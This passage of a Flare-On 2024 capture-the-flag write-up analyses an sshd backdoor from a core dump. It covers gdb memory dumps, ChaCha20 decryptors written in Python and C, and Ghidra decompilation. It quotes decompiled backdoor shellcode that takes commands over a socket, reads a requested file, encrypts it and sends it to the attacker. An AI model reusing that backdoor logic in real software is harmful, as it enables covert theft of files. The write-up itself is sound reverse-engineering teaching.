+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8d5:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x18</span>],<span style="color:#66d9ef">r11</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8da:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">rdi</span>,<span style="color:#66d9ef">r15</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8dd:      <span style="color:#a6e22e">mov</span>    <span style="color:#66d9ef">QWORD</span> <span style="color:#66d9ef">PTR</span> [<span style="color:#66d9ef">rsp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x10</span>],<span style="color:#66d9ef">r10</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">0</span>x7f4a18c8f8e2:      <span style="color:#a6e22e">call</span>   <span style="color:#ae81ff">0x7f4a18c8f3f0</span>
+</span></span></code></pre></div><p>focus on:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">r11</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x24</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">r10</span>, [<span style="color:#66d9ef">rbp</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x04</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">r11</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">r10</span>
+</span></span></code></pre></div><p>the data we have been examining in $rsi, $rbp also points to this data:</p>
+<pre tabindex="0"><code>rsi            0x55b46d51dde0      94233416556000
+rbp            0x55b46d51dde0      0x55b46d51dde0
+</code></pre><p>based on this we can assume that chacha20 is initialized as such:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ChaCha20<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>[rbp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x04</span>], nonce<span style="color:#f92672">=</span>[rbp<span style="color:#f92672">+</span><span style="color:#ae81ff">0x36</span>])
+</span></span></code></pre></div><p>lets extract the encrypted payload so we can decrypt it!</p>
+<p><code>(gdb) dump memory encrypted 0x7f4a18ca9960 0x7f4a18ca9960+0x0f96</code></p>
+<p>following the pycryptodome documentation for ChaCha20 we create the following decryptor:</p>
+<p><strong>decrypt.py</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ChaCha20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;rsi&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    key_data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encrypted&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    encrypted <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ChaCha20<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>key_data[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">36</span>], nonce<span style="color:#f92672">=</span>key_data[<span style="color:#ae81ff">36</span>:<span style="color:#ae81ff">48</span>])
+</span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encrypted)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;decrypted&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(decrypted)
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] done&#34;</span>)
+</span></span></code></pre></div><p>unfortunately the decrypted data is not the flag, but, it is instead shellcode! lets disassemble and decompile it in ghidra. open the decrypted file in ghidra and specify the language as x86 64 gcc. ghidra wont automatically disassemble the program, so click on the first instruction and press &ldquo;d&rdquo;, this should disassemble the entire program in one go.</p>
+<p>the program doesnt look very interesting at first glance, thats because the first function we see is just to call the main function</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UndefinedFunction_00000000</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000dc2</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>jump into <code>FUN_00000dc2()</code> and this is where the FUN begins haha get it
+ahem sorry</p>
+<hr>
+<h3 id="finding-the-stolen-data-flag">Finding the stolen data (flag)<a hidden class="anchor" aria-hidden="true" href="#finding-the-stolen-data-flag">#</a></h3>
+<p>the decompilation of the main function of the program is pretty ugly at first glance</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">FUN_00000dc2</span>(undefined8 param_1,undefined8 param_2)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cVar1;
+</span></span><span style="display:flex;"><span>  undefined4 uVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar3;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar4;
+</span></span><span style="display:flex;"><span>  byte bVar6;
+</span></span><span style="display:flex;"><span>  undefined local_12a0 [<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>  undefined local_1280 [<span style="color:#ae81ff">61</span>];
+</span></span><span style="display:flex;"><span>  undefined uStack_1243;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_1170 [<span style="color:#ae81ff">4228</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_ec;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>pcVar5;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  bVar6 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  uVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">FUN_0000001a</span>(param_1,param_2,<span style="color:#ae81ff">0x539</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  uStack_1243 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  lVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  pcVar5 <span style="color:#f92672">=</span> local_1170;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    pcVar4 <span style="color:#f92672">=</span> pcVar5;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    lVar3 <span style="color:#f92672">=</span> lVar3 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    pcVar4 <span style="color:#f92672">=</span> pcVar5 <span style="color:#f92672">+</span> (ulong)bVar6 <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    cVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pcVar5;
+</span></span><span style="display:flex;"><span>    pcVar5 <span style="color:#f92672">=</span> pcVar4;
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (cVar1 <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\0&#39;</span>);
+</span></span><span style="display:flex;"><span>  local_ec <span style="color:#f92672">=</span> <span style="color:#f92672">~</span>(uint)lVar3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000cd2</span>(pcVar4,local_1170,local_12a0,local_1280,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000d49</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">syscall</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0000000b</span>(uVar2,local_1170,local_ec);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0000008f</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>to clean this up we can navigate to the script manager in ghidra, filter for syscall and run the <code>ResolveX86orX64LinuxSyscallsScript.java</code> script.. (i had to edit the script to exclude the ELF header check)</p>
+<p>now we have a much more clean looking shellcode decompilation:</p>
+<p><img loading="lazy" src="/images/flare2024/decrypted_shellcode.png"></p>
+<hr>
+<p>performing further analysis on the decrypted shellcode, we gain an understanding on how the attackers interacted with the backdoor and how data was exfiltrated. in the &ldquo;real world&rdquo; xz-utils backdoor, the attackers specified what type of action they wanted to take against the infected system when they initiated the ssh connection. refer to the following <a href="https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/">article</a> for a better explanation.</p>
+<p>in this case, the backdoor initiates a socket connection and executes <code>recvfrom()</code> to recieve commands from the remote attacker.</p>
+<p>paying attention the following snippet:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>__fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">init_socket</span>(param_1,param_2,<span style="color:#ae81ff">0x539</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recvfrom</span>(__fd,local_12a0,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recvfrom</span>(__fd,local_1280,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recvfrom</span>(__fd,<span style="color:#f92672">&amp;</span>local_f0,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">recvfrom</span>(__fd,local_1270,(ulong)local_f0,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>local_1270[(<span style="color:#66d9ef">int</span>)sVar2] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>__fd_00 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(local_1270,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(__fd_00,local_1170,<span style="color:#ae81ff">128</span>);
+</span></span></code></pre></div><p>without diving too deep into whats happening, the first two sizes specified in <code>recvfrom</code> are 32 and 12, the same sizes of a key and nonce for the ChaCha20 stream cipher. the third call to recvfrom stores the result in &amp;local_f0, which is then used as a size for the following <code>recvfrom</code> call. this could be used to specify the size of the string they are going to pass in the next and final <code>recvfrom</code> call.
+the string in the 4th and final <code>recvfrom</code> call is terminated and passed to open, where 128 bytes are then read from the file.</p>
+<p>with the large distance from $rsp, these values could very well still be present on the stack, lets go search for them in the coredump..</p>
+<h4 id="searching-for-c2-commands">Searching for c2 commands<a hidden class="anchor" aria-hidden="true" href="#searching-for-c2-commands">#</a></h4>
+<p>the stack is more than likely misalligned in its current state, but we can assume that the values will be relatively close to their original location due to the small amount of execution between the backdoor and the crash point.</p>
+<p><img loading="lazy" src="/images/flare2024/exfil_file.png"></p>
+<p><code>$rsp-0x1270</code> shows a partial string, and with some simple enumeration we find that the file exfiltrated is now located at <code>$rsp-0x1288</code>. this is great, as we can now determine where the exfiltrated data lies in memory and we know the file that was exfiltrated!</p>
+<h4 id="encryption-of-exfiltrated-data">Encryption of exfiltrated data<a hidden class="anchor" aria-hidden="true" href="#encryption-of-exfiltrated-data">#</a></h4>
+<p>now focusing on the next part of the malicious shellcode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">FUN_00000cd2</span>(pcVar4,local_1170,local_12a0,local_1280);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FUN_00000d49</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sendto</span>(__fd,local_ec,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sendto</span>(__fd,local_1170,(ulong)local_ec[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,<span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p>this looks extremely similar to the ChaCha20 initialization that we saw earlier in the backdoor. we know that local_12a0 holds a value of 32 and local_1280 holds a value of 12. analyzing <code>FUN_00000cd2()</code> and the subfunctions called within reveal that it is indeed a form of encryption. reviewing the entire execution is out of scope for this writeup, but due to the following constant:</p>
+<p><img loading="lazy" src="/images/flare2024/chacha20constant.png"></p>
+<p>we can confidently say this is a ChaCha20 stream cipher encryption function. similar to how we saw in the first steps of the backdoor, the exfiltrated data is first encrypted with the key and nonce specified by the attacker, then send to the attacker using the <code>sendto</code> function calls over the socket.</p>
+<h4 id="decrypting-exfiltrated-data">Decrypting exfiltrated data<a hidden class="anchor" aria-hidden="true" href="#decrypting-exfiltrated-data">#</a></h4>
+<p>before we can decrypt the exfiltrated data we need to first find the data, the key and the nonce. referencing the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">recvfrom</span>(__fd,local_12a0,<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recvfrom</span>(__fd,local_1280,<span style="color:#ae81ff">12</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">recvfrom</span>(__fd,<span style="color:#f92672">&amp;</span>local_f0,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>sVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">recvfrom</span>(__fd,local_1270,(ulong)local_f0,<span style="color:#ae81ff">0</span>,(sockaddr <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>,(<span style="color:#66d9ef">socklen_t</span> <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>);
+</span></span><span style="display:flex;"><span>local_1270[(<span style="color:#66d9ef">int</span>)sVar2] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>__fd_00 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(local_1270,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(__fd_00,local_1170,<span style="color:#ae81ff">128</span>);
+</span></span></code></pre></div><p>we know that the locations on the stack will be offset by 0x18.</p>
+<pre tabindex="0"><code>(gdb) dump memory chacha20_key $rsp-0x12b8 $rsp-(0x12b8-32)
+(gdb) dump memory chacha20_nonce $rsp-0x1298 $rsp-(0x1298-12)
+(gdb) dump memory chacha20_data $rsp-0x1188 $rsp-(0x1188-128)
+</code></pre><p>modify our decrypt.py program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ChaCha20
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;chacha20_key&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;chacha20_nonce&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;chacha20_data&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    encrypted <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> ChaCha20<span style="color:#f92672">.</span>new(key<span style="color:#f92672">=</span>key, nonce<span style="color:#f92672">=</span>nonce)
+</span></span><span style="display:flex;"><span>decrypted <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(encrypted)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;decrypted_flag&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(decrypted)
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] done&#34;</span>)
+</span></span></code></pre></div><p>and run it!</p>
+<pre tabindex="0"><code>$ cat decrypted_flag
+(E[]x|]^tR}A%NC;v
+                 5q~1)m5mK&lt;밠   @vqU6sN)«&#34;lVJ*u_bC
+</code></pre><p>thats clearly not a flag. so what went wrong?</p>
+<p>saving you from a headache, after careful enumeration of the encryption function we will notice that the constant used is:</p>
+<p><code>expand 32-byte K</code></p>
+<p>well, the constant used in ChaCha20 is:</p>
+<p><code>expand 32-byte k</code> (lower-case k)</p>
+<p>to overcome this we can use <a href="https://github.com/Ginurx/chacha20-c">this</a> chacha20 C implementation, modifying <code>chacha20.c</code> changing the magic constant from the lowecase k to uppercase K, then writing the following decrypt C program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;chacha20.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> fd;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> c;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> counter;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> key[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> nonce[<span style="color:#ae81ff">12</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> data[<span style="color:#ae81ff">128</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> chacha20_context ctx;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;chacha20_key&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(fd, key, <span style="color:#ae81ff">32</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;chacha20_nonce&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(fd, nonce, <span style="color:#ae81ff">12</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;chacha20_data&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(fd, data, <span style="color:#ae81ff">128</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chacha20_init_context</span>(<span style="color:#f92672">&amp;</span>ctx, key, nonce, counter);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chacha20_xor</span>(<span style="color:#f92672">&amp;</span>ctx, data, <span style="color:#ae81ff">128</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    c <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, data, <span style="color:#ae81ff">128</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>compile the program with gcc</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -o decrypt decrypt.c chacha20.c
+</span></span></code></pre></div><p>and get flag :)</p>
+<p><img loading="lazy" src="/images/flare2024/flag.png"></p>
+<hr>
+<p>if you made it this far thanks for reading i hope you learned a thing or two. unfortunately this is as far as i made in Flare this year. out of the 5 challenges solved this was by far my favorite which is why i included it in my writeups. goodbye!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share sshd (extended writeup) on x"
+            href="https://x.com/intent/tweet/?text=sshd%20%28extended%20writeup%29&amp;url=https%3a%2f%2fyams.bot%2fwriteups%2fflareon2024%2fsshd%2f&amp;hashtags=">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share sshd (extended writeup) on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fyams.bot%2fwriteups%2fflareon2024%2fsshd%2f&amp;title=sshd%20%28extended%20writeup%29&amp;summary=sshd%20%28extended%20writeup%29&amp;source=https%3a%2f%2fyams.bot%2fwriteups%2fflareon2024%2fsshd%2f">
